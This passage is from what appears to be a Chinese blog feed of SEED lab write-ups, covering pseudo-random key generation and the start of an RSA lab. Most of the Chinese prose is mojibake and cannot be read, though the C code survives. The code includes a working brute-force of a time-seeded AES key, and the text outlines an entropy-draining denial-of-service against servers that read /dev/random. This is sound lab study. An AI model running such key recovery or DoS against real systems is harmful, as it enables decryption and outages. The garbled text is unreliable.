align="left">å«ä¹‰</th></tr></thead><tbody><tr><td align="left">in</td><td align="left">è¾“å…¥æ•°æ®ï¼Œé•¿åº¦ä»»æ„</td></tr><tr><td align="left">out</td><td align="left">è¾“å‡ºæ•°æ®ï¼Œèƒ½å¤Ÿå®¹çº³ä¸‹è¾“å…¥æ•°æ®ï¼Œä¸”é•¿åº¦å¿…é¡»æ˜¯16å­—èŠ‚çš„å€æ•°ã€‚</td></tr><tr><td align="left">length</td><td align="left">è¾“å…¥æ•°æ®çš„å®é™…é•¿åº¦ã€‚</td></tr><tr><td align="left">key</td><td align="left">ä½¿ç”¨AES_set_encrypt_key/AES_set_decrypt_keyç”Ÿæˆçš„Key</td></tr><tr><td align="left">ivec</td><td align="left">å¯è¯»å†™çš„ä¸€å—å†…å­˜ã€‚é•¿åº¦å¿…é¡»æ˜¯16å­—èŠ‚ã€‚</td></tr><tr><td align="left">enc</td><td align="left">AES_ENCRYPT ä»£è¡¨åŠ å¯†ï¼Œ AES_DECRYPTä»£è¡¨è§£å¯†</td></tr></tbody></table><p>ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;openssl/aes.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEYSIZE 16</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> i,j;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> encryptText[<span class="hljs-number">17</span>];<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> plainText[<span class="hljs-number">17</span>] = <span class="hljs-string">&quot;\x25\x50\x44\x46\x2d\x31\x2e\x35\x0a\x25\xd0\xd4\xc5\xd8\x0a\x34&quot;</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> target_str[<span class="hljs-number">17</span>] = <span class="hljs-string">&quot;\xd0\x6b\xf9\xd0\xda\xb8\xe8\xef\x88\x06\x60\xd2\xaf\x65\xaa\x82&quot;</span>;<br><span class="hljs-keyword">int</span> target_time = <span class="hljs-number">1524020929</span>;<br><span class="hljs-keyword">for</span> (i = target_time;i &gt;=target_time - <span class="hljs-number">60</span>*<span class="hljs-number">60</span>*<span class="hljs-number">2</span> ; i--)<br>&#123;<br>srand(i);<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> key[KEYSIZE];<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> ini_vec[<span class="hljs-number">17</span>] =  <span class="hljs-string">&quot;\x09\x08\x07\x06\x05\x04\x03\x02\x01\x00\xA2\xB2\xC2\xD2\xE2\xF2&quot;</span>;<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; KEYSIZE; j++) <br>&#123;<br>key[j] = rand() % <span class="hljs-number">256</span>;<br><span class="hljs-comment">//printf(&quot;%.2x&quot;, (unsigned char)key[j]);</span><br>&#125;<br>AES_KEY enc_key;<br>AES_set_encrypt_key(key, <span class="hljs-number">128</span> , &amp;enc_key);<br>AES_cbc_encrypt(plainText, encryptText, <span class="hljs-number">16</span> , &amp;enc_key, ini_vec, AES_ENCRYPT);     <span class="hljs-comment">// åŠ å¯†</span><br><br><span class="hljs-keyword">int</span> flag=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">16</span>;j++)<br>&#123;<br><span class="hljs-keyword">if</span>(encryptText[j]!=target_str[j])<br>&#123;<br>flag=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(flag)<br>&#123;<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;the key is : &quot;</span>;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">16</span>;j++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2x&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)key[j]);<br>&#125;<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-comment">//return 0;</span><br>&#125;<br><br>&#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Task-3-Measure-the-Entropy-of-Kernel"><a href="#Task-3-Measure-the-Entropy-of-Kernel" class="headerlink" title="Task 3: Measure the Entropy of Kernel"></a>Task 3: Measure the Entropy of Kernel</h1><p>ä»¥ä¸‹è¡Œä¸ºå¯ä»¥å¢åŠ ç†µï¼š</p><ul><li>  ç§»åŠ¨ã€ç‚¹å‡»é¼ æ ‡</li><li>  æ•²å‡»é”®ç›˜</li><li>  åˆ‡æ¢ä»»åŠ¡ï¼Œè¿è¡Œç¨‹åº</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add_keyboard_randomness</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> scancode)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add_mouse_randomness</span><span class="hljs-params">(__u32 mouse_data)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add_interrupt_randomness</span><span class="hljs-params">(<span class="hljs-keyword">int</span> irq)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add_blkdev_randomness</span><span class="hljs-params">(<span class="hljs-keyword">int</span> major)</span></span>;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥æ‰¾å†…æ ¸å½“å‰çš„ç†µå€¼ï¼ˆä¸åŒäºä¿¡æ¯è®ºä¸­ç†µçš„å«ä¹‰ã€‚åœ¨è¿™é‡Œï¼Œå®ƒä»…ä»…æ„å‘³ç€ç³»ç»Ÿå½“å‰æœ‰å¤šå°‘ä½éšæœºæ•°ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">watch -n <span class="hljs-number">.1</span> cat /proc/sys/kernel/random/entropy_avail<br></code></pre></td></tr></table></figure><h1 id="Task-4-Get-Pseudo-Random-Numbers-from-dev-random"><a href="#Task-4-Get-Pseudo-Random-Numbers-from-dev-random" class="headerlink" title="Task 4: Get Pseudo Random Numbers from /dev/random"></a>Task 4: Get Pseudo Random Numbers from /dev/random</h1><h2 id="å…³äºç†µï¼š"><a href="#å…³äºç†µï¼š" class="headerlink" title="å…³äºç†µï¼š"></a>å…³äºç†µï¼š</h2><ul><li><p>  Linuxå†…æ ¸é‡‡ç”¨ç†µæ¥æè¿°æ•°æ®çš„éšæœºæ€§</p></li><li><p>  ç†µæ˜¯æè¿°ç³»ç»Ÿæ··ä¹±æ— åºç¨‹åº¦çš„ç‰©ç†é‡ï¼Œä¸€ä¸ªç³»ç»Ÿçš„ç†µè¶Šå¤§åˆ™è¯´æ˜è¯¥ç³»ç»Ÿçš„æœ‰åºæ€§è¶Šå·®ï¼Œå³ä¸ç¡®å®šæ€§è¶Šå¤§</p></li><li><p>  <code>/dev/random</code>æ˜¯é˜»å¡çš„ï¼Œ<code>/dev/urandom</code>æ˜¯â€œunblockedâ€ï¼Œéé˜»å¡çš„éšæœºæ•°å‘ç”Ÿå™¨</p></li></ul><p><strong>å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤è·å¾—è¯»å–ä¼ªéšæœºæ•°å¹¶ç”¨<code>hexdump</code>  æ‰“å°ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /dev/random | hexdump</span><br></code></pre></td></tr></table></figure><ul><li><p>  å¦‚æœä¸ä½œä»»ä½•æ“ä½œï¼Œç†µå€¼ç¼“æ…¢ç¨³å®šå¢åŠ ï¼ˆæˆ–è®¸æ˜¯å› ä¸ºæ—¶é—´ï¼‰</p></li><li><p>  å¦‚æœç‚¹å‡»é¼ æ ‡æˆ–è€…æ“ä½œé”®ç›˜ç­‰æ“ä½œï¼Œç†µå€¼å¿«é€Ÿå¢åŠ  </p></li><li><p>  è§¦å‘äº§ç”Ÿéšæœºæ•°çš„ç†µå€¼å¤§å°ä¸ºä¸º 64ï¼Œæ¯æ¬¡äº§ç”Ÿä¸€ä¸ªéšæœºæ•°éƒ½ä¼šé™ä½ç†µå€¼ï¼Œå¦‚æœä½äº64åˆ™ä¸ä¼šäº§ç”Ÿéšæœºæ•°</p></li><li><p>  è‹¥ç†µæ± ç©ºäº†ï¼Œå¯¹<code>/dev/random</code>çš„è¯»æ“ä½œå°†ä¼šè¢«é˜»å¡ï¼Œç›´åˆ°æ”¶é›†åˆ°äº†è¶³å¤Ÿçš„ç¯å¢ƒå™ªå£°ä¸ºæ­¢</p></li></ul><h2 id="Qï¼ša-server-uses-dev-random-to-generate-the-random-session-key-with-a-client-Please-escribe-how-you-can-launch-a-Denial-Of-Service-DOS-attack-on-such-a-server"><a href="#Qï¼ša-server-uses-dev-random-to-generate-the-random-session-key-with-a-client-Please-escribe-how-you-can-launch-a-Denial-Of-Service-DOS-attack-on-such-a-server" class="headerlink" title="Qï¼ša server uses /dev/random to generate the random session key with a client. Please escribe how you can launch a Denial-Of-Service (DOS) attack on such a server."></a>Qï¼ša server uses /dev/random to generate the random session key with a client. Please escribe how you can launch a Denial-Of-Service (DOS) attack on such a server.</h2><ul><li>  ä½¿å¾—serveræ— æ³•äº§ç”Ÿåºåˆ—å·å³å¯</li><li>  <code>/dev/random</code>å¦‚æœæ²¡æœ‰è¶³å¤Ÿçš„å¯ç”¨ç†µï¼Œè¯»å–å°†åœ¨æŸäº›ç³»ç»Ÿä¸Šé˜»å¡</li><li>  é€šè¿‡åˆ›å»ºå¤§é‡ä¼šè¯ id å¿«é€Ÿä»ç³»ç»Ÿä¸­é™ä½ç†µï¼Œå¯¼è‡´<code>/dev/random</code>é˜»å¡ï¼Œä»è€Œä½¿å¾—æ­£å¸¸çš„åºåˆ—å·æ— æ³•äº§ç”Ÿ</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">$ head -c <span class="hljs-number">1</span>M /dev/urandom &gt; output.bin<br>$ ent output.bin<br></code></pre></td></tr></table></figure><ul><li><p>  Entropy = 7.999845 bits per byte.</p></li><li><p>  æœ€ä½³å‹ç¼©ä¼šå°†è¿™ä¸ª 1048576 å­—èŠ‚æ–‡ä»¶çš„å¤§å°å‡å°‘ 0%ã€‚</p></li><li><p>  1048576 ä¸ªæ ·æœ¬çš„å¡æ–¹åˆ†å¸ƒä¸º 225.47ï¼Œéšæœºè¶…è¿‡è¯¥å€¼çš„æ¦‚ç‡ä¸º 90.86%ã€‚</p></li><li><p>  æ•°æ®å­—èŠ‚çš„ç®—æœ¯å¹³å‡å€¼ä¸º 127.4740ï¼ˆ127.5 = éšæœºï¼‰</p></li><li><p>  Pi çš„è’™ç‰¹å¡ç½—å€¼ä¸º 3.145969948ï¼ˆè¯¯å·® 0.14%ï¼‰</p></li><li><p>  åºåˆ—ç›¸å…³ç³»æ•°ä¸º 0.000297ï¼ˆå®Œå…¨ä¸ç›¸å…³ = 0.0ï¼‰</p></li><li><p>  ç»¼ä¸Šï¼Œç”Ÿæˆéšæœºæ•°è´¨é‡æ˜¯å¾ˆå¥½çš„</p></li></ul><h1 id="Task-5-Get-Random-Numbers-from-dev-urandom"><a href="#Task-5-Get-Random-Numbers-from-dev-urandom" class="headerlink" title="Task 5: Get Random Numbers from /dev/urandom"></a>Task 5: Get Random Numbers from /dev/urandom</h1><p>Linux æä¾›äº†é€šè¿‡<code>/dev/urandom</code> è®¾å¤‡è®¿é—®éšæœºæ± çš„å¦ä¸€ç§æ–¹æ³•ï¼Œåªæ˜¯è¿™ä¸ªè®¾å¤‡ä¸ä¼šé˜»å¡ã€‚/dev/Random å’Œ<code>/dev/urandom</code> éƒ½ä½¿ç”¨æ± ä¸­çš„éšæœºæ•°æ®æ¥ç”Ÿæˆä¼ªéšæœºæ•°ã€‚å½“ç†µä¸è¶³æ—¶,<code>/dev/Random</code> å°†æš‚åœï¼Œè€Œ<code>/dev/urandom</code> å°†ç»§ç»­ç”Ÿæˆæ–°çš„æ•°å­—</p><ul><li>  <code>/dev/urandom</code>çš„uæŒ‡çš„æ˜¯â€œunblockedâ€ï¼Œä¸ä¼šè¢«é˜»å¡</li><li>  è¿è¡ŒæŒ‡ä»¤ï¼Œä¼šä¸æ–­åœ°æ‰“å°è¾“å‡º</li></ul><p>ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;openssl/aes.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LEN 32 <span class="hljs-comment">// 256 bits</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>* key = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> * ) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>) * LEN);<br>FILE * random = fopen(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>fread(key, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>) * LEN, <span class="hljs-number">1</span>, random);<br>fclose(random);<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;LEN;i++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2x&quot;</span>,key[i]);<br>&#125;<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-labï¼šRSA Public-Key Encryption and Signature Lab</title>
    <link href="/p/383dc23/"/>
    <url>/p/383dc23/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/seed/rsaflow.jpg"></p><h1 id="å†™åœ¨labä¹‹å‰"><a href="#å†™åœ¨labä¹‹å‰" class="headerlink" title="å†™åœ¨labä¹‹å‰"></a>å†™åœ¨labä¹‹å‰</h1><h2 id="RSAç®—æ³•çš„æ•°å­¦è§£é‡Š"><a href="#RSAç®—æ³•çš„æ•°å­¦è§£é‡Š" class="headerlink" title="RSAç®—æ³•çš„æ•°å­¦è§£é‡Š"></a>RSAç®—æ³•çš„æ•°å­¦è§£é‡Š</h2><ul><li>  éšæœºé€‰æ‹©ä¸¤ä¸ªä¸ç›¸åŒçš„ç´ æ•° $p, q$ ã€‚</li><li>  $p, q$ å°†ç›¸ä¹˜, ä¸º $n=p \times q$ ã€‚</li><li>  è®¡ç®— $\mathrm{n}$ çš„æ¬§æ‹‰å‡½æ•° $\varphi(\mathrm{n})$, æ¬§æ‹‰å‡½æ•°è¯æ˜, å½“ $p, q$ ä¸ºä¸ç›¸åŒçš„ç´ æ•°æ—¶,$\varphi(n)=(p-1)(q-1) ã€‚$</li><li>  éšæœºé€‰æ‹©ä¸€ä¸ªæ•´æ•° $\mathrm{e}$, æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶: $\varphi(n)$ ä¸ $\mathrm{e}$ è´¨,ä¸” $1&lt;e&lt;\varphi(n)$ ã€‚</li><li>  è®¡ç®— $\mathrm{e}$ å¯¹äº $p(n)$ çš„é€†å…ƒ $\mathrm{d}$, ä¹Ÿå°±æ˜¯è¯´æ‰¾åˆ°ä¸€ä¸ª $\mathrm{d}$ æ»¡è¶³ $e d=1 \bmod \varphi(n)$ ã€‚</li><li>  è¿™ä¸ªå¼å­ç­‰ä»·äº $e d-1=k \varphi(n)$, å®é™…ä¸Šå°±æ˜¯å¯¹äºæ–¹ç¨‹ $e d-k \varphi(n)=1$æ±‚ $(d, k)$ çš„æ•´æ•°è§£ã€‚è¿™ä¸ªæ–¹ç¨‹å¯ä»¥ç”¨æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚è§£ã€‚</li><li>  æœ€ç»ˆæŠŠ $(e, n)$ å°è£…æˆå…¬é’¥ï¼Œ $(d, n)$ å°è£…æˆç§é’¥ã€‚</li><li>  <strong>å…¬é’¥åŠ å¯†ï¼Œç§é’¥è§£å¯†</strong></li><li>  <strong>ç§é’¥ç­¾åï¼Œå…¬é’¥éªŒè¯</strong></li></ul><p>å¯¹äºå¤§æ•°è¿ç®—ï¼Œä¸èƒ½ä½¿ç”¨Cè¯­è¨€åŸºæœ¬çš„æ•°æ®ç±»å‹ï¼Œè€Œæ˜¯è¦ä½¿ç”¨ openssl æä¾›çš„ big num libraryï¼Œæˆ‘ä»¬å°†æŠŠæ¯ä¸ªå¤§æ•°å®šä¹‰ä¸ºä¸€ä¸ª BIGNUM ç±»å‹ï¼Œç„¶åä½¿ç”¨åº“æä¾›çš„ API è¿›è¡Œå„ç§æ“ä½œï¼Œå¦‚åŠ æ³•ã€ä¹˜æ³•ã€æ±‚å¹‚ã€æ¨¡å—åŒ–æ“ä½œç­‰ï¼Œbig number APIså¯ä»¥åœ¨ <a href="https://linux.die.net/man/3/bn">https://linux.die.net/man/3/bn</a> æ‰¾åˆ°</p><p><code>BN_CTX</code> æ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œç”¨äºå­˜å‚¨å¤§æ•°è¿ç®—æ—¶ç”¨åˆ°çš„ä¸´æ—¶å˜é‡ã€‚é€šè¿‡åŠ¨æ€åˆ†é…å†…å­˜æ–¹å¼åˆ›å»º<code>BIGNUM</code>çš„å¼€é”€æ¯”è¾ƒå¤§ï¼Œæ‰€ä»¥ä½¿ç”¨ <code>BN_CTX </code>æ¥æé«˜æ•ˆç‡ã€‚</p><p>ä»£ç çš„å…·ä½“å®ç°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//åŠ¨æ€åˆ†é…å¹¶åˆå§‹åŒ–ä¸€ä¸ª BIGNUM ç»“æ„ä½“</span><br><span class="hljs-function">BIGNUM *<span class="hljs-title">BN_new</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><br><span class="hljs-comment">//ossl_typ.h</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bignum_st</span> &#123;</span><br>         BN_ULONG *d;<br>         <span class="hljs-keyword">int</span> top;<br>         <span class="hljs-keyword">int</span> dmax;<br>         <span class="hljs-keyword">int</span> neg;<br>         <span class="hljs-keyword">int</span> flags;<br>&#125;;<br><br><span class="hljs-comment">// bn_lcl.h </span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bignum_st</span> <span class="hljs-title">BIGNUM</span>;</span><br></code></pre></td></tr></table></figure><ul><li>  ç¼–è¯‘å‘½ä»¤</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc cr.c -lcrypto<br></code></pre></td></tr></table></figure><ul><li><p>ä½¿ç”¨<code>BIGNUM</code>åº“è¿›è¡Œå¾ˆå¤šä½çš„å¤§æ•°æ“ä½œ</p><ul><li><p>æ¨¡æ„ä¹‰ä¸‹çš„å¹‚è¿ç®—</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">BN_mod_exp(res, a, c, n, ctx)<br></code></pre></td></tr></table></figure></li><li><p>ä¸¤ä¸ªå¤§æ•°ç›¸ä¹˜</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//Compute res = a âˆ— b. It should be noted that a BN CTX structure is need in this API</span><br>BN_mul(res, a, b, ctx)<br></code></pre></td></tr></table></figure></li><li><p>æ±‚é€†å…ƒ</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//Compute modular inverse, i.e., given a, find b, such that a âˆ— b mod n = 1. The value b is called the inverse of a, with respect to modular n</span><br>BN_mod_inverse(b, a, n, ctx)<br></code></pre></td></tr></table></figure><p>åœ¨labPDFä¸­ï¼Œæœ‰ç€æ›´å¤šçš„ä½¿ç”¨èŒƒä¾‹</p></li></ul></li></ul><h1 id="3-1-Task-1-Deriving-the-Private-Key"><a href="#3-1-Task-1-Deriving-the-Private-Key" class="headerlink" title="3.1 Task 1: Deriving the Private Key"></a>3.1 Task 1: Deriving the Private Key</h1><p>è®¾ pï¼Œqï¼Œe æ˜¯ä¸‰ä¸ªè´¨æ•°ã€‚è®¾ n = p * qã€‚æˆ‘ä»¬å°†ä½¿ç”¨(eï¼Œn)ä½œä¸ºå…¬é’¥ï¼Œè¯·è®¡ç®—ç§é’¥ dã€‚pã€q å’Œ e çš„åå…­è¿›åˆ¶å€¼å¦‚ä¸‹æ‰€ç¤º</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">p</span> = F<span class="hljs-number">7</span>E<span class="hljs-number">75</span>FDC<span class="hljs-number">469067</span>FFDC<span class="hljs-number">4</span>E<span class="hljs-number">847</span>C<span class="hljs-number">51</span>F<span class="hljs-number">452</span>DF<br><span class="hljs-attribute">q</span> = E<span class="hljs-number">85</span>CED<span class="hljs-number">54</span>AF<span class="hljs-number">57</span>E<span class="hljs-number">53</span>E<span class="hljs-number">092113</span>E<span class="hljs-number">62</span>F<span class="hljs-number">436</span>F<span class="hljs-number">4</span>F<br><span class="hljs-attribute">e</span> = <span class="hljs-number">0</span>D<span class="hljs-number">88</span>C<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>åŸç†å¯è§å‰é¢<strong>RSAç®—æ³•çš„æ•°å­¦è§£é‡Š</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;openssl/bn.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NBITS 256</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    BN_CTX *ctx = BN_CTX_new();<br>    BIGNUM *p = BN_new();<br>    BIGNUM *p_1 = BN_new();<br>    BIGNUM *q = BN_new();<br>    BIGNUM *q_1 = BN_new();<br>    BIGNUM *e = BN_new();<br>    BIGNUM *d = BN_new();<br>    BIGNUM *n = BN_new();<br>    BIGNUM *phi_n = BN_new();<br>    BIGNUM *res = BN_new();<br>    BIGNUM *one = BN_new();<br>    <span class="hljs-comment">//å¯¹pã€qã€eè¿›è¡Œèµ‹å€¼</span><br>    BN_hex2bn(&amp;p, <span class="hljs-string">&quot;F7E75FDC469067FFDC4E847C51F452DF&quot;</span>);<br>    BN_hex2bn(&amp;q, <span class="hljs-string">&quot;E85CED54AF57E53E092113E62F436F4F&quot;</span>);<br>    BN_hex2bn(&amp;e, <span class="hljs-string">&quot;0D88C3&quot;</span>);<br>    BN_hex2bn(&amp;one, <span class="hljs-string">&quot;1&quot;</span>);<br>    <span class="hljs-comment">//è®¡ç®—å¾—å‡ºp*q=n</span><br>    BN_mul(n, p, q, ctx);<br>    <span class="hljs-comment">//phi_n=(p-1)*(q-1)</span><br>    BN_sub(p_1, p, one);<br>    BN_sub(q_1, q, one);<br>    BN_mul(phi_n,p_1, q_1, ctx);<br>    BN_mod_inverse(d, e, phi_n, ctx);<br><br>    <span class="hljs-comment">//print function</span><br>    <span class="hljs-keyword">char</span> * number_str = BN_bn2hex(n);<br>    <span class="hljs-keyword">char</span> * number_str1 = BN_bn2hex(d);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;p 